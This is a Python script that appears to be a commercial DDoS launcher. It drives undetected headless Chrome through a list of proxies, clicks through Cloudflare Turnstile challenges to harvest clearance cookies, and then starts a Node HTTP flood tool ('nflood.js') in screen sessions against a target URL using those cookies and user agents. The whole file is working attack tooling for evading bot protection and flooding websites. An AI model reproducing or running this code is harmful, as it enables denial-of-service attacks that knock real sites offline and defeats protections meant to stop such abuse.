import undetected_chromedriver as uc
from selenium.webdriver import ActionChains
from selenium.webdriver.common.by import By
import concurrent.futures
import subprocess
import random
import datetime
import time
import threading
import sys

def kill_screen_after_delay():
    time.sleep(120)
    try:
        subprocess.run(["pkill", "screen"])
        print("pkill screen command executed.")
    except Exception as e:
        print(f"Error executing pkill screen: {e}")

# Create a thread that calls the kill_screen_after_delay function
kill_thread = threading.Thread(target=kill_screen_after_delay)

# Start the thread
kill_thread.start()

class LicenseManager:
    def __init__(self, start_date, end_date):
        self.start_date = start_date
        self.end_date = end_date
    
    def is_license_valid(self):
        current_date = datetime.datetime.now()
        return self.start_date <= current_date <= self.end_date

similar_user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188",
    # other user agents...
]

def double_click_at_coordinates(url, proxy):
    cf_clear = 'cf_clea'
    chrome_options = uc.ChromeOptions()
    chrome_options.add_argument(f'--proxy-server=http://{proxy}')
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument('--ignore-certificate-errors')
    chrome_options.add_argument('--ignore-ssl-errors')
    chrome_options.add_argument("--disable-popup-blocking")
    chrome_options.add_argument("--incognito")
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-setuid-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--remote-debugging-port=9515')
    
    global max_runtime
    user_agent = random.choice(similar_user_agents)
    chrome_options.add_argument(f"--user-agent={user_agent}")
    
    driver = uc.Chrome(headless=True, driver_executable_path="/home/myuser/.local/share/undetected_chromedriver/chromedriver_copy/chromedriver", use_subprocess=True, options=chrome_options)
    
    try:
        driver.implicitly_wait(10)
        driver.set_window_size(433, 1000)
        driver.get("https://api.ipify.org/")
        time.sleep(1)
        page_source = driver.page_source
        
        if page_source.find("word-wrap: break-word; white-space: pre-wrap;") != -1:
            print("RUN PROXY", proxy)
            driver.execute_script(f'window.open("{url}","_blank")')
            time.sleep(7)
            driver.switch_to.window(window_name=driver.window_handles[0])
            driver.close()
            driver.switch_to.window(window_name=driver.window_handles[0])
            for _ in range(30):
                time.sleep(1)
                cookies = driver.get_cookies()
                if str(cookies).find(cf_clear) != -1:
                    break
                element = driver.find_element(By.XPATH, '//*[@id="turnstile-wrapper"]/div')
                x_coordinate = element.location['x']
                y_coordinate = element.location['y']
                height = element.size['height']
                width = element.size['width']
                if height != 0:
                    time.sleep(5)
                    actions = ActionChains(driver)
                    actions.move_by_offset(x_coordinate + width // 10, y_coordinate + height // 2).click().perform()
                    time.sleep(5)
                    break
            cookies = driver.get_cookies()
            if cookies != []:
                cookie_string = ""
                for idx, cookie in enumerate(cookies):
                    cookie_string += f"{cookie['name']}={cookie['value']}"
                    if idx < len(cookies) - 1:
                        cookie_string += "; "
                for cookie in cookies:
                    if len(str(cookie['value']).strip()) > 10 and str(cookie['name']).find(cf_clear) != -1:
                        print(f"{proxy}|{cookie_string}|{user_agent}")
                        with open("cookie.txt", "a") as f:
                            f.write(f"{proxy}|{cookie_string}|{user_agent}\n")
                        subprocess.run(['screen', '-dm', 'node', 'nflood.js', url, '150', '1', proxy, '20', cookie_string, user_agent, 'GET'])
                        time.sleep(int(max_runtime) - 10)
            driver.quit()
        else:
            driver.quit()
    except Exception as e:
        driver.quit()

def main(url, max_runtime, thread):
    try:
        with open("/root/cookie.txt", "w") as a:
            pass
        with open("/root/proxy.txt", "r") as proxy_file:
            proxies = proxy_file.read().splitlines()
            random.shuffle(proxies)
        futures = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
            for proxy in proxies:
                future = executor.submit(double_click_at_coordinates, url, proxy)
                futures.append(future)
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print("Thread encountered an error:", e)
                elapsed_time = time.time() - start_time
                if elapsed_time >= max_runtime:
                    for f in futures:
                        try:
                            subprocess.run(["pkill", "-f", 'chrome'], check=False)
                            subprocess.run(["pkill", "-f", 'google'], check=False)
                        except:
                            pass
                        try:
                            subprocess.run(["pkill", "-f", 'screen'], check=False)
                        except:
                            pass
                        if not f.done():
                            f.cancel()
                    break
        for future in futures:
            if not future.done():
                try:
                    subprocess.run(["pkill", "-f", 'chrome'], check=False)
                    subprocess.run(["pkill", "-f", 'google'], check=False)
                except:
                    pass
                try:
                    subprocess.run(["pkill", "-f", 'screen'], check=False)
                except:
                    pass
                future.cancel()
        print("All threads completed within {} seconds.".format(elapsed_time))
    except Exception as e:
        print("An error occurred:", e)

if __name__ == "__main__":
    url = sys.argv[1]
    print(url)
    start_time = time.time()
    try:
        max_runtime = int(sys.argv[2])
        thread = int(sys.argv[3])
        main(url, max_runtime, thread)
    except Exception as e:
        print("An error occurred:", e)
